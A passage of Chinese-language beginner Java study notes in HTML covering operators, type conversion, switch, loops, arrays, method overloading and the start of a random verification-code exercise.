<li>创建class类</li>
<li>在类中编写代码</li>
<li>完成编译运行</li>
</ul>
<h6 id="一些小Tips"><a class="header-anchor" href="#一些小Tips">¶</a>一些小Tips</h6>
<ul>
<li>在IDEA中删除类，不走回收站，直接从硬盘中删掉</li>
</ul>
<h6 id="创建Module"><a class="header-anchor" href="#创建Module">¶</a>创建Module</h6>
<p>PDF上部大约50页前后处</p>
<h2 id="Day3-运算符"><a class="header-anchor" href="#Day3-运算符">¶</a>Day3 运算符</h2>
<h3 id="运算符与表达式"><a class="header-anchor" href="#运算符与表达式">¶</a>运算符与表达式</h3>
<h4 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h4>
<ul>
<li>
<p><strong>运算符</strong>：就是对常量或者变量进⾏操作的符号。⽐如： + - * /</p>
</li>
<li>
<p><strong>表达式</strong>：⽤运算符把常量或者变量连接起来的，符合Java语法的式⼦就是表达式。⽐如：a + b 这个整体就是表达式。⽽其中+是算术运算符的⼀种，所以这个表达式也称之为算术表达式</p>
</li>
</ul>
<h4 id="算术运算符注意点"><a class="header-anchor" href="#算术运算符注意点">¶</a>算术运算符注意点</h4>
<ul>
<li><code>/</code>
<ul>
<li><strong>整数</strong>相除结果只能得到<strong>整数</strong>，如果结果想要是⼩数，必须要有<strong>⼩数参数</strong></li>
<li>⼩数直接参与运算，得到的结果有可能是不精确的</li>
</ul>
</li>
</ul>
<h3 id="隐式转换"><a class="header-anchor" href="#隐式转换">¶</a>隐式转换</h3>
<h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h4>
<ul>
<li>
<p>也叫⾃动类型提升</p>
</li>
<li>
<p>就是把⼀个<strong>取值范围⼩</strong>的数据或者变量，赋值给另⼀个<strong>取值范围⼤</strong>的变量</p>
</li>
<li>
<p>不需要额外写代码单独实现，程序⾃动完成</p>
</li>
<li>
<p>简单记忆：小的给大的可以直接给</p>
</li>
</ul>
<h5 id="两种提升规则"><a class="header-anchor" href="#两种提升规则">¶</a>两种提升规则</h5>
<ul>
<li>取值范围⼩的，和取值范围⼤的进⾏运算，⼩的会先提升为⼤的，再进⾏运算</li>
<li>byte、short、char三种类型的数据在运算的时候，都会直接先提升为int，然后再进⾏运算</li>
<li>取值范围从⼩到⼤的关系：<code>byte short int long float double</code></li>
</ul>
<h3 id="强制转换"><a class="header-anchor" href="#强制转换">¶</a>强制转换</h3>
<h4 id="概念-v2"><a class="header-anchor" href="#概念-v2">¶</a>概念</h4>
<ul>
<li>如果要把⼀个<strong>取值范围⼤</strong>的数据或者变量赋值给另⼀个<strong>取值范围⼩</strong>的变量，不允许直接操作，需要加⼊强制转换</li>
</ul>
<h4 id="书写格式"><a class="header-anchor" href="#书写格式">¶</a>书写格式</h4>
<ul>
<li><code>⽬标数据类型 变量名 = （⽬标数据类型）被强转的数据；</code></li>
</ul>
<h4 id="注意"><a class="header-anchor" href="#注意">¶</a>注意</h4>
<ul>
<li>强制转换可能会导致数据发生错误（数据的精度丢失）</li>
</ul>
<h3 id="字符串的"><a class="header-anchor" href="#字符串的">¶</a>字符串的+</h3>
<ul>
<li>字符串的连接符，产生一个新的字符串</li>
<li>从左到右逐个执行</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">&quot;abc&quot;</span> + <span class="number">1</span>;    <span class="comment">// &quot;1abc1&quot;</span></span><br><span class="line"><span class="number">1</span> + <span class="number">2</span> + <span class="string">&quot;abc&quot;</span> + <span class="number">2</span> + <span class="number">1</span>;  <span class="comment">// &quot;3abc21&quot;</span></span><br><span class="line">	<span class="comment">// 第一步没有字符串参与，所以是整型相加</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;⿊默丁格&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;我的名字是&quot;</span> + name);</span><br><span class="line"><span class="comment">// 字符串和变量相加→跟变量里的值进行拼接</span></span><br></pre></td></tr></table></figure>
<ul>
<li>有字符串参与的步骤就是字符串拼接</li>
<li>字符串只有+操作，没有其他操作</li>
</ul>
<h3 id="字符的"><a class="header-anchor" href="#字符的">¶</a>字符的+</h3>
<h4 id="规则"><a class="header-anchor" href="#规则">¶</a>规则</h4>
<ul>
<li>当+操作中出现了<strong>字符</strong>，会拿着字符到计算机内置的<strong>ASCII码</strong>表中去查对应的数字，然后再进⾏计算</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c + <span class="number">0</span>;</span><br><span class="line">System.out.println(result);  <span class="comment">//97</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	&#x27;a&#x27; --- 97</span></span><br><span class="line"><span class="comment">	&#x27;A&#x27; --- 65</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="自增-自减运算符"><a class="header-anchor" href="#自增-自减运算符">¶</a>自增/自减运算符</h3>
<ul>
<li>
<p>也就是<ins>a 和 a</ins>的区别问题了</p>
</li>
<li>
<p>使⽤⽅式：</p>
<ul>
<li><code>++a</code>（前缀递增）和<code>a++</code>（后缀递增）的主要区别在于它们增加变量的值的时间点以及返回的值</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用前缀递增</span></span><br><span class="line">System.out.println(<span class="string">&quot;++a: &quot;</span> + (++a)); <span class="comment">// 输出: ++a: 2</span></span><br><span class="line">System.out.println(<span class="string">&quot;a after ++a: &quot;</span> + a); <span class="comment">// 输出: a after ++a: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用后缀递增</span></span><br><span class="line">System.out.println(<span class="string">&quot;a++: &quot;</span> + (b++)); <span class="comment">// 输出: a++: 1</span></span><br><span class="line">System.out.println(<span class="string">&quot;b after a++: &quot;</span> + b); <span class="comment">// 输出: b after a++: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在一个表达式中使用</span></span><br><span class="line"><span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> ++c + c++; <span class="comment">// 注意这里</span></span><br><span class="line"><span class="comment">//            c=4      c=5</span></span><br><span class="line"><span class="comment">// 相当于int result = (++c) + (c++);</span></span><br><span class="line">System.out.println(<span class="string">&quot;result: &quot;</span> + result); <span class="comment">// 输出: result: 9</span></span><br><span class="line">System.out.println(<span class="string">&quot;c after operations: &quot;</span> + c); <span class="comment">// 输出: c after operations: 5</span></span><br></pre></td></tr></table></figure>
<h3 id="逻辑运算符"><a class="header-anchor" href="#逻辑运算符">¶</a>逻辑运算符</h3>
<h4 id="异或"><a class="header-anchor" href="#异或">¶</a>异或(^)</h4>
<h5 id="规则-v2"><a class="header-anchor" href="#规则-v2">¶</a>规则</h5>
<ul>
<li>如果两边相同，结果为false，如果两边不同，结果为true</li>
</ul>
<h5 id="代码"><a class="header-anchor" href="#代码">¶</a>代码</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//^    -//左右不相同，结果才是true，左右相同结果就是false</span></span><br><span class="line">System.out.println(<span class="literal">true</span> ^ <span class="literal">true</span>);  <span class="comment">//false</span></span><br><span class="line">System.out.println(<span class="literal">false</span> ^ <span class="literal">false</span>);  <span class="comment">//false</span></span><br><span class="line">System.out.println(<span class="literal">true</span> ^ <span class="literal">false</span>);  <span class="comment">//true</span></span><br><span class="line">System.out.println(<span class="literal">false</span> ^ <span class="literal">true</span>);  <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<h4 id="取反"><a class="header-anchor" href="#取反">¶</a>取反</h4>
<ul>
<li>温馨提示：取反最多只⽤⼀个</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(!<span class="literal">true</span>);  <span class="comment">//false</span></span><br><span class="line">System.out.println(!!<span class="literal">false</span>);  <span class="comment">//注意点：取反最多只⽤⼀个</span></span><br></pre></td></tr></table></figure>
<h3 id="短路逻辑运算符"><a class="header-anchor" href="#短路逻辑运算符">¶</a>短路逻辑运算符</h3>
<h4 id="分类"><a class="header-anchor" href="#分类">¶</a>分类</h4>
<ul>
<li>&amp;&amp;</li>
<li>||</li>
</ul>
<h4 id="逻辑核心"><a class="header-anchor" href="#逻辑核心">¶</a>逻辑核心</h4>
<ul>
<li>当左边不能确定整个表达式的结果，右边才会执⾏</li>
<li>当左边能确定整个表达式的结果，那么右边就不会执⾏了。从⽽提⾼了代码的运⾏效率</li>
</ul>
<h4 id="举例"><a class="header-anchor" href="#举例">¶</a>举例</h4>
<ul>
<li><strong>⽤⼾登录案例</strong>
<ul>
<li>⽤⼾名正确 &amp; 密码正确
<ul>
<li>如果使⽤⼀个&amp;，不管⽤⼾名是否正确都会去验证密码。</li>
</ul>
</li>
<li>思考：
<ul>
<li>如果⽤⼾名输⼊正确了，那么我们再判断密码是否正确，是符合业务逻辑的。但是如果⽤⼾名输⼊错误了，那么现在还有必要去⽐较密码吗？没有不要了。</li>
<li>如果使⽤⼀个&amp;，那么左边和右边不管什么情况下，都会执⾏。</li>
</ul>
</li>
<li>⽤⼾名正确 &amp;&amp; 密码正确
<ul>
<li>如果⽤⼾名输⼊正确了，那么才会验证密码是否输⼊正确</li>
<li>如果<strong>⽤⼾名输⼊错误</strong>了，那么就不会再去验证密码是否正确，最终的结果<strong>直接为false</strong>。从⽽<strong>提⾼</strong>了程序运⾏的<strong>效率</strong>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h4>
<ul>
<li>&amp;&amp;和&amp;、||和|的运行结果一样</li>
<li>但是短路逻辑运算符可以提高程序的运行效率</li>
</ul>
<h3 id="三元运算符"><a class="header-anchor" href="#三元运算符">¶</a>三元运算符</h3>
<h4 id="格式"><a class="header-anchor" href="#格式">¶</a>格式</h4>
<ul>
<li>
<p><code>关系表达式 ? 表达式1 : 表达式2;</code></p>
</li>
<li>
<p>注意：三元运算符的最终结果⼀定要被使⽤，要么赋值给⼀个变量，要么直接打印出来</p>
</li>
</ul>
<h4 id="举例-v2"><a class="header-anchor" href="#举例-v2">¶</a>举例</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 求三个体重中的最大值</span></span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> height1 &gt; height2 ? height1 : height2;</span><br><span class="line"><span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> temp &gt; height3 ? temp : height3;</span><br></pre></td></tr></table></figure>
<h3 id="运算符的优先级"><a class="header-anchor" href="#运算符的优先级">¶</a>运算符的优先级</h3>
<ul>
<li>小括号优先于所有</li>
</ul>
<h2 id="Day4-判断和循环"><a class="header-anchor" href="#Day4-判断和循环">¶</a>Day4 判断和循环</h2>
<h3 id="switch的扩展知识"><a class="header-anchor" href="#switch的扩展知识">¶</a>switch的扩展知识</h3>
<ul>
<li>
<p>default的位置和省略情况</p>
<ul>
<li>default可以放在任意位置，也可以省略</li>
</ul>
</li>
<li>
<p>case穿透</p>
<ul>
<li>不写break会引发case穿透现象</li>
</ul>
</li>
<li>
<p>switch在JDK12的新特性</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="keyword">switch</span> (number) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> -&gt; System.out.println(<span class="string">&quot;⼀&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span> -&gt; System.out.println(<span class="string">&quot;⼆&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span> -&gt; System.out.println(<span class="string">&quot;三&quot;</span>);</span><br><span class="line">    <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;其他&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="举例-v3"><a class="header-anchor" href="#举例-v3">¶</a>举例</h4>
<ul>
<li>键盘录入星期数，输出工作日、休息日。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分析：</span></span><br><span class="line"><span class="comment">//1.键盘录⼊星期数</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;请输⼊星期&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">week</span> <span class="operator">=</span> sc.nextInt();  <span class="comment">//3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.利⽤switch进⾏匹配</span></span><br><span class="line"><span class="comment">// 利⽤case穿透简化代码</span></span><br><span class="line"><span class="keyword">switch</span> (week)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;⼯作⽇&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;	</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;休息⽇&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;没有这个星期&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利⽤JDK12简化代码书写</span></span><br><span class="line"><span class="keyword">switch</span> (week) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> -&gt; System.out.println(<span class="string">&quot;⼯作⽇&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>, <span class="number">7</span> -&gt; System.out.println(<span class="string">&quot;休息⽇&quot;</span>);</span><br><span class="line">    <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;没有这个星期&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day5-循环高级和数组"><a class="header-anchor" href="#Day5-循环高级和数组">¶</a>Day5 循环高级和数组</h2>
<h3 id="Random"><a class="header-anchor" href="#Random">¶</a>Random</h3>
<ul>
<li>作用：生成随机数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="comment">//  导包的动作必须出现在类定义的上边。</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> r.nextInt(随机数的范围);</span><br><span class="line"><span class="comment">// 随机数范围的特点：从0开始，不包含指定值，即[0, n)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建对象</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="comment">//3.⽣成随机数</span></span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> r.nextInt(<span class="number">100</span>);<span class="comment">//包左不包右，包头不包尾</span></span><br><span class="line"><span class="comment">//0 ~ 99</span></span><br><span class="line">System.out.println(number);</span><br></pre></td></tr></table></figure>
<h3 id="举例：逢七过"><a class="header-anchor" href="#举例：逢七过">¶</a>举例：逢七过</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line"><span class="comment">//2.判断每⼀个数字，如果符合规则，就打印过，如果不符合规则就打印真实的数字</span></span><br><span class="line"><span class="keyword">if</span>(i % <span class="number">10</span> == <span class="number">7</span> || i / <span class="number">10</span> % <span class="number">10</span> == <span class="number">7</span> || i % <span class="number">7</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;过&quot;</span>);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">	System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="举例：平方根"><a class="header-anchor" href="#举例：平方根">¶</a>举例：平方根</h3>
<ul>
<li>需求：键盘录⼊⼀个⼤于等于2的整数 x ，计算并返回 x 的 平⽅根 。结果只保留整数部分 ，⼩数部分将被舍去</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 1 * 1 = 1 &lt; 10</span></span><br><span class="line"><span class="comment">// 2 * 2 = 4 &lt; 10</span></span><br><span class="line"><span class="comment">// 3 * 3 = 9 &lt; 10</span></span><br><span class="line"><span class="comment">// 4 * 4 = 16 &gt; 10</span></span><br><span class="line"><span class="comment">//推断：10的平⽅根是在3~4之间。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 思路</span></span><br><span class="line"><span class="comment">//在代码当中</span></span><br><span class="line"><span class="comment">//从1开始循环，拿着数字的平⽅跟原来的数字进⾏⽐较</span></span><br><span class="line"><span class="comment">//如果⼩于的，那么继续往后判断</span></span><br><span class="line"><span class="comment">//如果相等，那么当前数字就是平⽅根</span></span><br><span class="line"><span class="comment">//如果⼤于的，那么前⼀个数字就是平⽅跟的整数部分</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.键盘录⼊⼀个整数</span></span><br><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;请输⼊⼀个整数&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line"><span class="comment">//2.从1开始循环判断</span></span><br><span class="line"><span class="comment">//开始：1 结束: number</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= number; i++) &#123;</span><br><span class="line"><span class="comment">//⽤i * i 再跟number进⾏⽐较</span></span><br><span class="line">    <span class="keyword">if</span>(i * i == number)&#123;</span><br><span class="line">    System.out.println(i + <span class="string">&quot;就是&quot;</span> + number + <span class="string">&quot;的平⽅根&quot;</span>);</span><br><span class="line">    <span class="comment">//⼀旦找到了，循环就可以停⽌了，后⾯的数字就不需要再找了，提⾼代码的运⾏效率。</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(i * i &gt; number)&#123;</span><br><span class="line">	System.out.println((i - <span class="number">1</span>) + <span class="string">&quot;就是&quot;</span> + number + <span class="string">&quot;平⽅根的整数部分&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数组"><a class="header-anchor" href="#数组">¶</a>数组</h3>
<h4 id="概念-v3"><a class="header-anchor" href="#概念-v3">¶</a>概念</h4>
<ul>
<li>
<p>指的是⼀种容器，可以同来存储同种数据类型的多个值。但是数组容器在存储数据的时候，需要结合<strong>隐式转换</strong>考虑</p>
</li>
<li>
<p>⽐如：定义了⼀个int类型的数组。那么boolean、double类型的数据是不能存到这个数组中的，但是byte类型，short类型，int类型的数据是可以存到这个数组⾥⾯的</p>
</li>
<li>
<p><strong>建议</strong>：容器的类，和存储的数据类型保持⼀致</p>
</li>
</ul>
<h4 id="定义-v2"><a class="header-anchor" href="#定义-v2">¶</a>定义</h4>
<ul>
<li>
<p>格式⼀：<code>数据类型 [] 数组名</code></p>
</li>
<li>
<p>格式⼆：<code>数据类型 数组名 []</code></p>
</li>
<li>
<p>都行</p>
</li>
</ul>
<h4 id="数组练习：打乱数据"><a class="header-anchor" href="#数组练习：打乱数据">¶</a>数组练习：打乱数据</h4>
<ul>
<li>需求：定义⼀个数组，存⼊1~5。要求打乱数组中所有数据的顺序</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.定义数组存储1~5</span></span><br><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="comment">// 2.循环遍历数组，从0索引开始打乱数据的顺序</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="comment">// ▷⽣成⼀个随机索引</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(arr.length);</span><br><span class="line">    <span class="comment">// 拿着随机索引指向的元素 跟 i 指向的元素进⾏交换</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">    arr[i] = arr[randomIndex];</span><br><span class="line">    arr[randomIndex] = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当循环结束之后，那么数组中所有的数据已经打乱顺序了</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    System.out.print(arr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day6-方法"><a class="header-anchor" href="#Day6-方法">¶</a>Day6 方法</h2>
<h3 id="方法重载"><a class="header-anchor" href="#方法重载">¶</a>方法重载</h3>
<ul>
<li>
<p>概念：⽅法重载指同⼀个类中定义的多个⽅法之间的关系，满⾜下列条件的多个⽅法相互构成重载：</p>
<ul>
<li>多个⽅法在同⼀个类中</li>
<li>多个⽅法具有<strong>相同的⽅法名</strong></li>
<li>多个⽅法的<strong>参数不相同</strong>，<strong>类型不同</strong>或者<strong>数量不同</strong></li>
</ul>
</li>
<li>
<p>注意：</p>
<ul>
<li>重载仅对应⽅法的定义，与⽅法的调⽤⽆关，调⽤⽅式参照标准格式</li>
<li>重载仅针对同⼀个类中⽅法的名称与参数进⾏识别，与返回值⽆关，换句话说<strong>不能通过返回值来判定</strong>两个⽅法是否相互构成重载</li>
</ul>
</li>
</ul>
<h4 id="重载-练习"><a class="header-anchor" href="#重载-练习">¶</a>重载-练习</h4>
<ul>
<li>
<p>需求：使⽤⽅法重载的思想，设计<em>⽐较两个整数是否相同</em>的⽅法，兼容全整数类型（byte,short,int,long）</p>
</li>
<li>
<p>思路：</p>
<ul>
<li>
<p>定义⽐较两个数字的是否相同的⽅法compare()⽅法，参数选择两个int型参数</p>
</li>
<li>
<p>定义对应的重载⽅法，变更对应的参数类型，参数变更为两个long型参数</p>
</li>
<li>
<p>定义所有的重载⽅法，两个byte类型与两个short类型参数</p>
</li>
<li>
<p>完成⽅法的调⽤，测试运⾏结果</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        System.out.println(compare(<span class="number">10</span>, <span class="number">20</span>));</span><br><span class="line">		System.out.println(compare((<span class="type">byte</span>) <span class="number">10</span>, (<span class="type">byte</span>) <span class="number">20</span>));</span><br><span class="line">		System.out.println(compare((<span class="type">short</span>) <span class="number">10</span>, (<span class="type">short</span>) <span class="number">20</span>));</span><br><span class="line">		System.out.println(compare(<span class="number">10L</span>, <span class="number">20L</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;int&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// byte</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">byte</span> a, <span class="type">byte</span> b)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;byte&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//short</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">short</span> a, <span class="type">short</span> b)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;short&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//long</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;long&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day7-综合练习"><a class="header-anchor" href="#Day7-综合练习">¶</a>Day7 综合练习</h2>
<h3 id="练习三：验证码"><a class="header-anchor" href="#练习三：验证码">¶</a>练习三：验证码</h3>
<ul>
<li><strong>需求</strong>：定义⽅法实现随机产⽣⼀个5位的验证码</li>
<li><strong>验证码格式</strong>：⻓度为5，前四位是⼤写字⺟或者⼩写字⺟，最后⼀位是数字</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 需求：</span></span><br><span class="line"><span class="comment">            定义⽅法实现随机产⽣⼀个5位的验证码</span></span><br><span class="line"><span class="comment">            验证码格式：</span></span><br><span class="line"><span class="comment">            ⻓度为5</span></span><br><span class="line"><span class="comment">            前四位是⼤写字⺟或者⼩写字⺟</span></span><br><span class="line"><span class="comment">            最后⼀位是数字 </span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 分析</span></span><br><span class="line">        <span class="comment">// 1.大写字母和小写字母都放到数组中</span></span><br><span class="line">        <span class="type">char</span>[] chs = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">52</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; chs.length; i ++) &#123;</span><br><span class="line">            <span class="comment">// ASCII表</span></span><br><span class="line">            <span class="keyword">if</span> (i &lt;= <span class="number">25</span>) &#123;</span><br><span class="line">                <span class="comment">// 添加小写字母</span></span><br><span class="line">                chs[i] = (<span class="type">char</span>)(<span class="number">97</span> + i);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 添加大写字母</span></span><br><span class="line">                chs[i] = (<span class="type">char</span>)(<span class="number">65</span> + i - <span class="number">26</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义⼀个字符串类型的变量，⽤来记录最终的结果</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 2.随机抽取4次</span></span><br><span class="line">		<span class="comment">// 随机抽取数组中的索引</span></span><br><span class="line">		<span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">		